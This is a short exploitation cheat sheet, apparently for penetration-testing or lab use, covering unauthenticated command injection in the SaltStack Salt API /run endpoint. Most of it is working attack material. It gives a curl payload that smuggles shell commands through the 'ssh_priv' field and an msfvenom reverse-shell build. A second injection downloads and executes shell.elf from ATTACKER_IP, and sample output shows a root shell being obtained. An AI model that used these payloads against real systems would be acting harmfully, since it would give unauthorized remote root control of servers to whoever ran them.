# SaltStack

SaltStack Salt API exposed on HTTP can allow unauthenticated command injection through the `/run` endpoint when the vulnerable SSH client path is reachable.

## Salt API Indicators

The API response can expose Salt API through headers:

```text
HTTP/1.1 200 OK
Server: nginx/1.16.1
Content-Type: application/json
Allow: GET, HEAD, POST
Access-Control-Allow-Origin: *
X-Upstream: salt-api/3000-1
```

Some paths may show CherryPy behind the API:

```text
http://TARGET:8000/ssh
404 Not Found
The path '/ssh' was not found.
Powered by CherryPy 5.6.0
```

## Salt API Command Injection

Confirm command execution with an ICMP callback:

```bash
sudo tcpdump -i tun0 icmp

curl -i http://TARGET:8000/run \
  -H "Content-type: application/json" \
  -d '{"client":"ssh","tgt":"A","fun":"B","eauth":"C","ssh_priv":"| /usr/bin/ping -c 4 ATTACKER_IP  #"}'
```

Expected response:

```text
HTTP/1.1 200 OK
{"return": [{}]}
```

Expected callback:

```text
IP TARGET > ATTACKER_IP: ICMP echo request
IP ATTACKER_IP > TARGET: ICMP echo reply
```

## Reverse Shell

Generate and host a Linux ELF reverse shell:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=80 -f elf -o shell.elf
python3 -m http.server
nc -nlvp 80
```

Use the Salt API injection to download and execute it:

```bash
curl -i http://TARGET:8000/run \
  -H "Content-type: application/json" \
  -d '{"client":"ssh","tgt":"A","fun":"B","eauth":"C","ssh_priv":"| /usr/bin/curl http://ATTACKER_IP:8000/shell.elf -o /tmp/shell.elf; chmod +x /tmp/shell.elf; /tmp/shell.elf  #"}'
```

Successful shell:

```text
connect to [ATTACKER_IP] from TARGET
uid=0(root) gid=0(root) groups=0(root)
```

## References

- https://github.com/zomy22/CVE-2020-16846-Saltstack-Salt-API
- https://github.com/advisories/GHSA-qr38-h96j-2j3w
